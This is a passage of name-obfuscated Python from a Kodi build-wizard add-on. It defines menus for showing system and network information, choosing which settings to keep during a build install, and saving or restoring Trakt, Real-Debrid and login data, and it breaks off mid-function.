	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:2737
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O000O000O00 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2738
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O000O000O00 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2739
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2741
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O000O000O00 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2742
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O000O000O00 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2743
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2745
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0O0O00O0OOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2746
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0O000O0OOO0OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2747
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO000O000OO0O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2748
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2750
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000OO00O0O000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2751
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOO0O000OO00OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2752
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO00OOO000O000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2753
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2755
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O000O000O00 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2756
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00000OOO00O00000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2757
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0OOO0000O0OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2758
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOO0O0O0OO00O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2759
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O000O000O00 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2760
	O00OOO0O000000O0O =len (O00OO0O0OOO000000 )+len (O0O0O0OO00OOOOOOO )+len (O00O0O0OOOOO0O0O0 )+len (O0000OO00OO0000O0 )+len (OOO0O0OOO00O0OO00 )+len (O0OO000O00OOOO00O )+len (O000O0O0O0OOOOO0O )#line:2762
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O00OOO0O000000O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2763
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00O0O0OOOOO0O0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2764
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0000OO00OO0000O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2765
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0O0OO00OOOOOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2766
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00OO0O0OOO000000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2767
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000O0O0O0OOOOO0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2768
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OO000O00OOOO00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2769
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0O0OOO00O0OO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2770
def Menu ():#line:2771
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2772
def saveMenu ():#line:2774
	O00O0O000O000OOO0 ='[COLOR green]מופעל[/COLOR]';OO0O000000OOO000O ='[COLOR red]מבוטל[/COLOR]'#line:2776
	O00OOO0OOO00OO0O0 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:2777
	O00OOOOO0OO000O00 ='true'if KEEPMOVIELIST =='true'else 'false'#line:2778
	O0OOO00000OOO0O00 ='true'if KEEPINFO =='true'else 'false'#line:2779
	OOO000O0OOO00O0OO ='true'if KEEPSOUND =='true'else 'false'#line:2781
	O00OOOOOO0OO000OO ='true'if KEEPVIEW =='true'else 'false'#line:2782
	OOO0O00O0OOOOOOO0 ='true'if KEEPSKIN =='true'else 'false'#line:2783
	OO0OO0OOO00000O00 ='true'if KEEPSKIN2 =='true'else 'false'#line:2784
	OOOO000000000OO00 ='true'if KEEPSKIN3 =='true'else 'false'#line:2785
	OOO0OO0O0O00OOO0O ='true'if KEEPADDONS =='true'else 'false'#line:2786
	OOO00O0O00OOO00O0 ='true'if KEEPPVR =='true'else 'false'#line:2787
	OO000O00OO0OO000O ='true'if KEEPTVLIST =='true'else 'false'#line:2788
	OO0O0O00O000O00OO ='true'if KEEPHUBMOVIE =='true'else 'false'#line:2789
	O00O0O00000000O00 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:2790
	O0O0O000OOOO00O00 ='true'if KEEPHUBTV =='true'else 'false'#line:2791
	OOO0OO00OO00OO0O0 ='true'if KEEPHUBVOD =='true'else 'false'#line:2792
	OOO0OOOO0000OOOO0 ='true'if KEEPHUBKIDS =='true'else 'false'#line:2793
	OOOOO00O0OOO00OOO ='true'if KEEPHUBMUSIC =='true'else 'false'#line:2794
	OOO0OOO0OO00O0000 ='true'if KEEPHUBMENU =='true'else 'false'#line:2795
	O00O0O0OOOO0OOO0O ='true'if KEEPPLAYLIST =='true'else 'false'#line:2796
	O0OO00OOOOO0OOOO0 ='true'if KEEPTRAKT =='true'else 'false'#line:2797
	OOO0000OO0O0000OO ='true'if KEEPREAL =='true'else 'false'#line:2798
	OO0O0O00O0O00OOOO ='true'if KEEPRD2 =='true'else 'false'#line:2799
	OO0OO0000O0000OOO ='true'if KEEPTORNET =='true'else 'true'#line:2800
	OO00O000O0O0O0O00 ='true'if KEEPLOGIN =='true'else 'false'#line:2801
	O00OO0O000O0O0OOO ='true'if KEEPSOURCES =='true'else 'false'#line:2802
	OO0000OO00000OOOO ='true'if KEEPADVANCED =='true'else 'false'#line:2803
	O0OOOO0O0O00OO0OO ='true'if KEEPPROFILES =='true'else 'false'#line:2804
	OO00OO0OOO00O0OO0 ='true'if KEEPFAVS =='true'else 'false'#line:2805
	O0OOOO00000O00OOO ='true'if KEEPREPOS =='true'else 'false'#line:2806
	OO0O0OO00OOO00O00 ='true'if KEEPSUPER =='true'else 'false'#line:2807
	OO0O0O00OOO00O000 ='true'if KEEPWHITELIST =='true'else 'false'#line:2808
	addFile ('אפשרויות שמירה קודי אנונימוס','',themeit =THEME3 )#line:2812
	if OO0O0O00OOO00O000 =='true':#line:2813
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:2814
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:2815
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:2816
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:2817
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:2818
	addFile ('%s התקנת קיר סרטים: '%O00OOO0OOO00OO0O0 .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:2820
	addFile ('%s שמירת חשבון RD: '%OOO0000OO0O0000OO .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:2821
	addFile ('%s שמירת חשבון טראקט: '%O0OO00OOOOO0OOOO0 .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:2822
	addFile ('%s שמירת מועדפים: '%OO00OO0OOO00O0OO0 .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:2825
	addFile ('%s שמירת לקוח טלוויזיה: '%OOO00O0O00OOO00O0 .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:2826
	addFile ('%s שמירת רשימת עורצי טלוויזיה: '%OO000O00OO0OO000O .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:2827
	addFile ('%s שמירת אריח סרטים: '%OO0O0O00O000O00OO .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:2828
	addFile ('%s שמירת אריח סדרות: '%O00O0O00000000O00 .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:2829
	addFile ('%s שמירת אריח טלויזיה: '%O0O0O000OOOO00O00 .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:2830
	addFile ('%s שמירת אריח תוכן ישראלי: '%OOO0OO00OO00OO0O0 .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:2831
	addFile ('%s שמירת אריח ילדים: '%OOO0OOOO0000OOOO0 .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:2832
	addFile ('%s שמירת אריח מוסיקה: '%OOOOO00O0OOO00OOO .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:2833
	addFile ('%s שמירת תפריט אריחים ראשי: '%OOO0OOO0OO00O0000 .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:2834
	addFile ('%s שמירת כל האריחים בסקין: '%OOO0O00O0OOOOOOO0 .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:2835
	addFile ('%s שמירת הרחבות שהתקנתי: '%OOO0OO0O0O00OOO0O .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:2842
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות: '%O0OOO00000OOO0O00 .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:2843
	addFile ('%s שמירת ספריית סרטים וסדרות: '%O00OOOOO0OO000O00 .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:2846
	addFile ('%s שמירת מקורות וידאו: '%O00OO0O000O0O0OOO .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:2847
	addFile ('%s שמירת הגדרות סאונד ורזולוציה: '%OOO000O0OOO00O0OO .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:2848
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה : '%O00OOOOOO0OO000OO .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:2850
	addFile ('%s שמירת פליליסט לאודר: '%O00O0O0OOOO0OOO0O .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:2851
	addFile ('%s שמירת הרחבות ידנית: '%OO0O0O00OOO00O000 .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keepwhitelist',icon =ICONSAVE ,themeit =THEME1 )#line:2852
	addFile ('%s שמירת הגדרות באפר: '%OO0000OO00000OOOO .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:2856
	addFile ('%s שמירת סופר מועדפים: '%OO0O0OO00OOO00O00 .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keepsuper',icon =ICONSAVE ,themeit =THEME1 )#line:2857
	addFile ('%s שמירת רשימות ריפו: '%O0OOOO00000O00OOO .replace ('true',O00O0O000O000OOO0 ).replace ('false',OO0O000000OOO000O ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:2858
	setView ('files','viewType')#line:2860
def traktMenu ():#line:2862
	O000OO000000OOO00 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:2863
	O00000O0000O00OO0 =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:2864
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:2865
	addFile ('Save Trakt Data: %s'%O000OO000000OOO00 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:2866
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O00000O0000O00OO0 ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2867
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2868
	for O000OO000000OOO00 in traktit .ORDER :#line:2870
		OO00O0O0OOO00O0OO =TRAKTID [O000OO000000OOO00 ]['name']#line:2871
		OOOOOOOO0OO000OOO =TRAKTID [O000OO000000OOO00 ]['path']#line:2872
		O0O00O000O00O000O =TRAKTID [O000OO000000OOO00 ]['saved']#line:2873
		O00OOOOOO00OO00O0 =TRAKTID [O000OO000000OOO00 ]['file']#line:2874
		OOO000OOO00O0O000 =wiz .getS (O0O00O000O00O000O )#line:2875
		OOO0000OO0O0OO0OO =traktit .traktUser (O000OO000000OOO00 )#line:2876
		O0OO00OO00OO0OOOO =TRAKTID [O000OO000000OOO00 ]['icon']if os .path .exists (OOOOOOOO0OO000OOO )else ICONTRAKT #line:2877
		OO0O0OOO000OO00O0 =TRAKTID [O000OO000000OOO00 ]['fanart']if os .path .exists (OOOOOOOO0OO000OOO )else FANART #line:2878
		OO0OO00O0OOOO0OOO =createMenu ('saveaddon','Trakt',O000OO000000OOO00 )#line:2879
		O0O000O0OO0OOO000 =createMenu ('save','Trakt',O000OO000000OOO00 )#line:2880
		OO0OO00O0OOOO0OOO .append ((THEME2 %'%s Settings'%OO00O0O0OOO00O0OO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O000OO000000OOO00 )))#line:2881
		addFile ('[+]-> %s'%OO00O0O0OOO00O0OO ,'',icon =O0OO00OO00OO0OOOO ,fanart =OO0O0OOO000OO00O0 ,themeit =THEME3 )#line:2883
		if not os .path .exists (OOOOOOOO0OO000OOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0OO00OO00OO0OOOO ,fanart =OO0O0OOO000OO00O0 ,menu =OO0OO00O0OOOO0OOO )#line:2884
		elif not OOO0000OO0O0OO0OO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O000OO000000OOO00 ,icon =O0OO00OO00OO0OOOO ,fanart =OO0O0OOO000OO00O0 ,menu =OO0OO00O0OOOO0OOO )#line:2885
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOO0000OO0O0OO0OO ,'authtrakt',O000OO000000OOO00 ,icon =O0OO00OO00OO0OOOO ,fanart =OO0O0OOO000OO00O0 ,menu =OO0OO00O0OOOO0OOO )#line:2886
		if OOO000OOO00O0O000 =="":#line:2887
			if os .path .exists (O00OOOOOO00OO00O0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O000OO000000OOO00 ,icon =O0OO00OO00OO0OOOO ,fanart =OO0O0OOO000OO00O0 ,menu =O0O000O0OO0OOO000 )#line:2888
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O000OO000000OOO00 ,icon =O0OO00OO00OO0OOOO ,fanart =OO0O0OOO000OO00O0 ,menu =O0O000O0OO0OOO000 )#line:2889
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO000OOO00O0O000 ,'',icon =O0OO00OO00OO0OOOO ,fanart =OO0O0OOO000OO00O0 ,menu =O0O000O0OO0OOO000 )#line:2890
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2892
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2893
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2894
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2895
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2896
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2897
	setView ('files','viewType')#line:2898
def realMenu ():#line:2900
	OO0O00000OO000O00 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:2901
	OO00O00O0OO0OOOO0 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:2902
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:2903
	addFile ('Save Real Debrid Data: %s'%OO0O00000OO000O00 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:2904
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OO00O00O0OO0OOOO0 ),'',icon =ICONREAL ,themeit =THEME3 )#line:2905
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:2906
	for O000OO0O00000O0O0 in debridit .ORDER :#line:2908
		OO00000OOOOO0000O =DEBRIDID [O000OO0O00000O0O0 ]['name']#line:2909
		OO00O0OOOO00OOO00 =DEBRIDID [O000OO0O00000O0O0 ]['path']#line:2910
		O0000OO00O0OOO0O0 =DEBRIDID [O000OO0O00000O0O0 ]['saved']#line:2911
		OO0O0OOOO0000000O =DEBRIDID [O000OO0O00000O0O0 ]['file']#line:2912
		O00O00O0OO00OOOOO =wiz .getS (O0000OO00O0OOO0O0 )#line:2913
		O00O00O0O00OOO0OO =debridit .debridUser (O000OO0O00000O0O0 )#line:2914
		OOO00O0OOO0O000OO =DEBRIDID [O000OO0O00000O0O0 ]['icon']if os .path .exists (OO00O0OOOO00OOO00 )else ICONREAL #line:2915
		OO0O000OOO0O00OOO =DEBRIDID [O000OO0O00000O0O0 ]['fanart']if os .path .exists (OO00O0OOOO00OOO00 )else FANART #line:2916
		O0000O0O00OOOO0OO =createMenu ('saveaddon','Debrid',O000OO0O00000O0O0 )#line:2917
		O00OO0OO000OOO000 =createMenu ('save','Debrid',O000OO0O00000O0O0 )#line:2918
		O0000O0O00OOOO0OO .append ((THEME2 %'%s Settings'%OO00000OOOOO0000O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O000OO0O00000O0O0 )))#line:2919
		addFile ('[+]-> %s'%OO00000OOOOO0000O ,'',icon =OOO00O0OOO0O000OO ,fanart =OO0O000OOO0O00OOO ,themeit =THEME3 )#line:2921
		if not os .path .exists (OO00O0OOOO00OOO00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOO00O0OOO0O000OO ,fanart =OO0O000OOO0O00OOO ,menu =O0000O0O00OOOO0OO )#line:2922
		elif not O00O00O0O00OOO0OO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O000OO0O00000O0O0 ,icon =OOO00O0OOO0O000OO ,fanart =OO0O000OOO0O00OOO ,menu =O0000O0O00OOOO0OO )#line:2923
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O00O00O0O00OOO0OO ,'authdebrid',O000OO0O00000O0O0 ,icon =OOO00O0OOO0O000OO ,fanart =OO0O000OOO0O00OOO ,menu =O0000O0O00OOOO0OO )#line:2924
		if O00O00O0OO00OOOOO =="":#line:2925
			if os .path .exists (OO0O0OOOO0000000O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O000OO0O00000O0O0 ,icon =OOO00O0OOO0O000OO ,fanart =OO0O000OOO0O00OOO ,menu =O00OO0OO000OOO000 )#line:2926
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O000OO0O00000O0O0 ,icon =OOO00O0OOO0O000OO ,fanart =OO0O000OOO0O00OOO ,menu =O00OO0OO000OOO000 )#line:2927
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00O00O0OO00OOOOO ,'',icon =OOO00O0OOO0O000OO ,fanart =OO0O000OOO0O00OOO ,menu =O00OO0OO000OOO000 )#line:2928
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2930
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2931
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2932
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2933
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2934
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2935
	setView ('files','viewType')#line:2936
def loginMenu ():#line:2938
	O000O000O0O0000OO ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:2939
	O0O00O0O000000O0O =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:2940
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:2941
	addFile ('Save Login Data: %s'%O000O000O0O0000OO ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:2942
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O0O00O0O000000O0O ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:2943
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:2944
	for O000O000O0O0000OO in loginit .ORDER :#line:2946
		OOOO0OO00OOO0OO00 =LOGINID [O000O000O0O0000OO ]['name']#line:2947
		O0OO0O000O00OO00O =LOGINID [O000O000O0O0000OO ]['path']#line:2948
		OO00O00O0000O0000 =LOGINID [O000O000O0O0000OO ]['saved']#line:2949
		O0OO0O0OOOOOO0000 =LOGINID [O000O000O0O0000OO ]['file']#line:2950
		O00000O00O0O00OOO =wiz .getS (OO00O00O0000O0000 )#line:2951
		O0O00OO000O0O0O00 =loginit .loginUser (O000O000O0O0000OO )#line:2952
		OOO000OO00OOOO00O =LOGINID [O000O000O0O0000OO ]['icon']if os .path .exists (O0OO0O000O00OO00O )else ICONLOGIN #line:2953
		OOOO0OO0000OO0OOO =LOGINID [O000O000O0O0000OO ]['fanart']if os .path .exists (O0OO0O000O00OO00O )else FANART #line:2954
		O0OOOO0O0OO0OO0O0 =createMenu ('saveaddon','Login',O000O000O0O0000OO )#line:2955
		O00O000000O00000O =createMenu ('save','Login',O000O000O0O0000OO )#line:2956
		O0OOOO0O0OO0OO0O0 .append ((THEME2 %'%s Settings'%OOOO0OO00OOO0OO00 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O000O000O0O0000OO )))#line:2957
		addFile ('[+]-> %s'%OOOO0OO00OOO0OO00 ,'',icon =OOO000OO00OOOO00O ,fanart =OOOO0OO0000OO0OOO ,themeit =THEME3 )#line:2959
		if not os .path .exists (O0OO0O000O00OO00O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOO000OO00OOOO00O ,fanart =OOOO0OO0000OO0OOO ,menu =O0OOOO0O0OO0OO0O0 )#line:2960
		elif not O0O00OO000O0O0O00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O000O000O0O0000OO ,icon =OOO000OO00OOOO00O ,fanart =OOOO0OO0000OO0OOO ,menu =O0OOOO0O0OO0OO0O0 )#line:2961
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0O00OO000O0O0O00 ,'authlogin',O000O000O0O0000OO ,icon =OOO000OO00OOOO00O ,fanart =OOOO0OO0000OO0OOO ,menu =O0OOOO0O0OO0OO0O0 )#line:2962
		if O00000O00O0O00OOO =="":#line:2963
			if os .path .exists (O0OO0O0OOOOOO0000 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O000O000O0O0000OO ,icon =OOO000OO00OOOO00O ,fanart =OOOO0OO0000OO0OOO ,menu =O00O000000O00000O )#line:2964
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O000O000O0O0000OO ,icon =OOO000OO00OOOO00O ,fanart =OOOO0OO0000OO0OOO ,menu =O00O000000O00000O )#line:2965
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00000O00O0O00OOO ,'',icon =OOO000OO00OOOO00O ,fanart =OOOO0OO0000OO0OOO ,menu =O00O000000O00000O )#line:2966
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2968
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2969
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2970
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2971
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2972
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:2973
	setView ('files','viewType')#line:2974
def fixUpdate ():#line:2976
	if KODIV <17 :#line:2977
		OO0000O0O00OOOOO0 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:2978
		try :#line:2979
			os .remove (OO0000O0O00OOOOO0 )#line:2980
		except Exception as OO000OO000OOOOO00 :#line:2981
